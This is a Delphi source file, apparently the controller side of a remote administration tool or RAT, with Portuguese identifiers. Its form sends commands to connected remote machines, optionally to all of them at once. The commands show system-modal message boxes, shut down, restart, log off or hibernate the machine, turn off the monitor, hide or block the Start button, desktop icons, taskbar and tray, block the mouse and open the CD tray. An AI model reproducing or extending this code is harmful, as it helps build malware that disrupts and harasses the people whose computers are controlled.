unit UnitDiversos;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, ExtCtrls, UnitMain, IdContext, Mask, VirtualTrees,
  sSkinProvider, UnitConexao;

type
  TFormDiversos = class(TForm)
    AdvGroupBox1: TGroupBox;
    AdvGroupBox2: TGroupBox;
    AdvGroupBox3: TGroupBox;
    AdvGroupBox4: TGroupBox;
    AdvGroupBox5: TGroupBox;
    AdvGroupBox6: TGroupBox;
    AdvOfficeRadioGroup1: TRadioGroup;
    AdvOfficeRadioGroup2: TRadioGroup;
    AdvOfficeRadioGroup3: TRadioGroup;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Image1: TImage;
    Image10: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    Image8: TImage;
    Image9: TImage;
    Memo1: TMemo;
    Edit1: TEdit;
    CheckBox1: TCheckBox;
    StatusBar1: TStatusBar;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button8: TButton;
    Button9: TButton;
    Button10: TButton;
    Button11: TButton;
    Button12: TButton;
    Button13: TButton;
    Button14: TButton;
    Button15: TButton;
    Button16: TButton;
    Button17: TButton;
    Button18: TButton;
    Button19: TButton;
    Button20: TButton;
    Button21: TButton;
    sSkinProvider1: TsSkinProvider;
    procedure FormShow(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);
    procedure Button12Click(Sender: TObject);
    procedure Button13Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button15Click(Sender: TObject);
    procedure Button16Click(Sender: TObject);
    procedure Button17Click(Sender: TObject);
    procedure Button18Click(Sender: TObject);
    procedure Button19Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button20Click(Sender: TObject);
    procedure Button21Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
    procedure EnviarComandos(xConAux: TConexaoNew; ToSend: string);
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormDiversos: TFormDiversos;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormDiversos.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormDiversos.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormDiversos.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

constructor TFormDiversos.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  i: integer;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  
  For i:= 0 to ComponentCount - 1 do
  if (Components[i] is TLabel) then
  TLabel(Components[i]).Transparent := True;
end;

procedure TFormDiversos.AtualizarIdioma;
begin
  AdvOfficeRadioGroup1.Caption := traduzidos[428] + ':';
  AdvOfficeRadioGroup1.Items.Strings[0] := traduzidos[429];
  AdvOfficeRadioGroup1.Items.Strings[1] := traduzidos[430];
  AdvOfficeRadioGroup1.Items.Strings[2] := traduzidos[431];
  AdvOfficeRadioGroup1.Items.Strings[3] := traduzidos[432];
  AdvOfficeRadioGroup1.Items.Strings[4] := traduzidos[433];

  AdvOfficeRadioGroup2.Caption := traduzidos[434] + ':';
  AdvOfficeRadioGroup2.Items.Strings[0] := traduzidos[435];
  AdvOfficeRadioGroup2.Items.Strings[1] := traduzidos[436];
  AdvOfficeRadioGroup2.Items.Strings[2] := traduzidos[437];
  AdvOfficeRadioGroup2.Items.Strings[3] := traduzidos[438];
  AdvOfficeRadioGroup2.Items.Strings[4] := traduzidos[439];
  AdvOfficeRadioGroup2.Items.Strings[5] := traduzidos[440];

  Button1.Caption := traduzidos[441];
  Button2.Caption := traduzidos[442];
  Button3.Caption := traduzidos[443];

  AdvOfficeRadioGroup3.Caption := traduzidos[444] + ':';
  AdvOfficeRadioGroup3.Items.Strings[0] := traduzidos[445];
  AdvOfficeRadioGroup3.Items.Strings[1] := traduzidos[446];
  AdvOfficeRadioGroup3.Items.Strings[2] := traduzidos[447];
  AdvOfficeRadioGroup3.Items.Strings[3] := traduzidos[448];
  AdvOfficeRadioGroup3.Items.Strings[4] := traduzidos[449];
  AdvOfficeRadioGroup3.Items.Strings[5] := traduzidos[450];

  AdvGroupBox1.Caption := traduzidos[451];
  Button4.Caption := traduzidos[452];
  Button5.Caption := traduzidos[453];
  Button6.Caption := traduzidos[454];
  Button7.Caption := traduzidos[455];

  AdvGroupBox2.Caption := traduzidos[456];
  Button8.Caption := traduzidos[452];
  Button9.Caption := traduzidos[453];
  Button10.Caption := traduzidos[454];
  Button11.Caption := traduzidos[455];

  AdvGroupBox3.Caption := traduzidos[457];
  Button12.Caption := traduzidos[452];
  Button13.Caption := traduzidos[453];
  Button14.Caption := traduzidos[454];
  Button15.Caption := traduzidos[455];

  AdvGroupBox4.Caption := traduzidos[458];
  Button16.Caption := traduzidos[452];
  Button17.Caption := traduzidos[453];

  AdvGroupBox5.Caption := traduzidos[459];
  Button18.Caption := traduzidos[460];
  Button19.Caption := traduzidos[461];

  Button20.Caption := traduzidos[454];
  Button21.Caption := traduzidos[455];

  CheckBox1.Caption := traduzidos[463];
end;

procedure TFormDiversos.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  TempInt: cardinal;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FDIVERSOS then
  begin
    StatusBar1.Panels.Items[0].Text := traduzidos[373];
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = FMESSAGE then
  begin
    delete(recebido, 1, posex('|', Recebido));
    TempInt := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));

    if TempInt = ID_OK then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[435] else
    if TempInt = ID_Yes then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[95] else
    if TempInt = ID_No then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[96] else
    if TempInt = ID_Cancel then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[464] else
    if TempInt = ID_Abort then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[465] else
    if TempInt = ID_Retry then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[466] else
    if TempInt = ID_Ignore then
    StatusBar1.Panels.Items[0].Text := traduzidos[462] + ': ' + traduzidos[467] else
    StatusBar1.Panels.Items[0].Text := traduzidos[468];

    if ConAux.MasterIdentification = 1234567890 then
    try
      ConAux.Connection.Disconnect;
      except
    end;
  end else

end;

procedure TFormDiversos.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if LiberarForm then Action := caFree;
end;

procedure TFormDiversos.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
end;

procedure TFormDiversos.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  Edit1.Text := nomedoprograma;
  Memo1.Text := nomedoprograma + ' ' + versaodoprograma;
  CheckBox1.Checked := false;
  StatusBar1.Panels.Items[0].Text := '';
end;

procedure TFormDiversos.Button1Click(Sender: TObject);
var
  mType, bType: cardinal;
begin
  if AdvOfficeRadioGroup2.ItemIndex = 0 then bType := MB_OK else
  if AdvOfficeRadioGroup2.ItemIndex = 1 then bType := MB_OKCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 2 then bType := MB_RETRYCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 3 then bType := MB_YESNO else
  if AdvOfficeRadioGroup2.ItemIndex = 4 then bType := MB_YESNOCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 5 then bType := MB_ABORTRETRYIGNORE;

  if AdvOfficeRadioGroup1.ItemIndex = 0 then mType := MB_ICONQUESTION else
  if AdvOfficeRadioGroup1.ItemIndex = 1 then mType := MB_ICONERROR else
  if AdvOfficeRadioGroup1.ItemIndex = 2 then mType := MB_ICONWARNING else
  if AdvOfficeRadioGroup1.ItemIndex = 3 then mType := MB_ICONINFORMATION else
  if AdvOfficeRadioGroup1.ItemIndex = 4 then mType := 0;

  messagebox(Handle, pchar(memo1.Text), pchar(edit1.Text), MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST or bType or mType);
end;

procedure TFormDiversos.EnviarComandos(xConAux: TConexaoNew; ToSend: string);
var
  TempStr: WideString;
  TempInt: integer;
  p: pointer;
begin
  if CheckBox1.Checked = true then
  begin
    TempStr := ToSend;
    TempInt := Length(TempStr) * 2;
    GetMem(p, TempInt);
    CopyMemory(p, @TempStr[1], TempInt);
    PostMessage(FormMain.Handle, WM_SENDALLSERVER, TempInt, integer(p));
  end else xConAux.EnviarString(ToSend);
end;

procedure TFormDiversos.Button20Click(Sender: TObject);
begin
  EnviarComandos(Servidor, MOUSE_BLOCK + '|');
end;

procedure TFormDiversos.Button21Click(Sender: TObject);
begin
  EnviarComandos(Servidor, MOUSE_UNBLOCK + '|');
end;

procedure TFormDiversos.Button2Click(Sender: TObject);
var
  mType, bType: cardinal;
begin
  if AdvOfficeRadioGroup2.ItemIndex = 0 then bType := MB_OK else
  if AdvOfficeRadioGroup2.ItemIndex = 1 then bType := MB_OKCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 2 then bType := MB_RETRYCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 3 then bType := MB_YESNO else
  if AdvOfficeRadioGroup2.ItemIndex = 4 then bType := MB_YESNOCANCEL else
  if AdvOfficeRadioGroup2.ItemIndex = 5 then bType := MB_ABORTRETRYIGNORE;

  if AdvOfficeRadioGroup1.ItemIndex = 0 then mType := MB_ICONQUESTION else
  if AdvOfficeRadioGroup1.ItemIndex = 1 then mType := MB_ICONERROR else
  if AdvOfficeRadioGroup1.ItemIndex = 2 then mType := MB_ICONWARNING else
  if AdvOfficeRadioGroup1.ItemIndex = 3 then mType := MB_ICONINFORMATION else
  if AdvOfficeRadioGroup1.ItemIndex = 4 then mType := 0;

  EnviarComandos(Servidor,
                 FMESSAGE + '|' +
                 inttostr(bType) + '|' +
                 inttostr(mType) + '|' +
                 Edit1.Text + DelimitadorComandos +
                 Memo1.Text);
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormDiversos.Button3Click(Sender: TObject);
begin
  if AdvOfficeRadioGroup3.ItemIndex = 0 then
  EnviarComandos(Servidor, POWEROFF + '|') else
  if AdvOfficeRadioGroup3.ItemIndex = 1 then
  EnviarComandos(Servidor, FSHUTDOWN + '|') else
  if AdvOfficeRadioGroup3.ItemIndex = 2 then
  EnviarComandos(Servidor, FHIBERNAR + '|') else
  if AdvOfficeRadioGroup3.ItemIndex = 3 then
  EnviarComandos(Servidor, FRESTART + '|') else
  if AdvOfficeRadioGroup3.ItemIndex = 4 then
  EnviarComandos(Servidor, FLOGOFF + '|') else
  if AdvOfficeRadioGroup3.ItemIndex = 5 then
  EnviarComandos(Servidor, FDESLMONITOR + '|');
end;

procedure TFormDiversos.Button4Click(Sender: TObject);
begin
  EnviarComandos(Servidor, BTN_START_HIDE + '|');
end;

procedure TFormDiversos.Button5Click(Sender: TObject);
begin
  EnviarComandos(Servidor, BTN_START_SHOW + '|');
end;

procedure TFormDiversos.Button6Click(Sender: TObject);
begin
  EnviarComandos(Servidor, BTN_START_BLOCK + '|');
end;

procedure TFormDiversos.Button7Click(Sender: TObject);
begin
  EnviarComandos(Servidor, BTN_START_UNBLOCK + '|');
end;

procedure TFormDiversos.Button8Click(Sender: TObject);
begin
  EnviarComandos(Servidor, DESK_ICO_HIDE + '|');
end;

procedure TFormDiversos.Button9Click(Sender: TObject);
begin
  EnviarComandos(Servidor, DESK_ICO_SHOW + '|');
end;

procedure TFormDiversos.Button10Click(Sender: TObject);
begin
  EnviarComandos(Servidor, DESK_ICO_BLOCK + '|');
end;

procedure TFormDiversos.Button11Click(Sender: TObject);
begin
  EnviarComandos(Servidor, DESK_ICO_UNBLOCK + '|');
end;

procedure TFormDiversos.Button12Click(Sender: TObject);
begin
  EnviarComandos(Servidor, TASK_BAR_HIDE + '|');
end;

procedure TFormDiversos.Button13Click(Sender: TObject);
begin
  EnviarComandos(Servidor, TASK_BAR_SHOW + '|');
end;

procedure TFormDiversos.Button14Click(Sender: TObject);
begin
  EnviarComandos(Servidor, TASK_BAR_BLOCK + '|');
end;

procedure TFormDiversos.Button15Click(Sender: TObject);
begin
  EnviarComandos(Servidor, TASK_BAR_UNBLOCK + '|');
end;

procedure TFormDiversos.Button16Click(Sender: TObject);
begin
  EnviarComandos(Servidor, SYSTRAY_ICO_HIDE + '|');
end;

procedure TFormDiversos.Button17Click(Sender: TObject);
begin
  EnviarComandos(Servidor, SYSTRAY_ICO_SHOW + '|');
end;

procedure TFormDiversos.Button18Click(Sender: TObject);
begin
  EnviarComandos(Servidor, OPENCD + '|');
end;

procedure TFormDiversos.Button19Click(Sender: TObject);
begin
  EnviarComandos(Servidor, CLOSECD + '|');
end;

end.
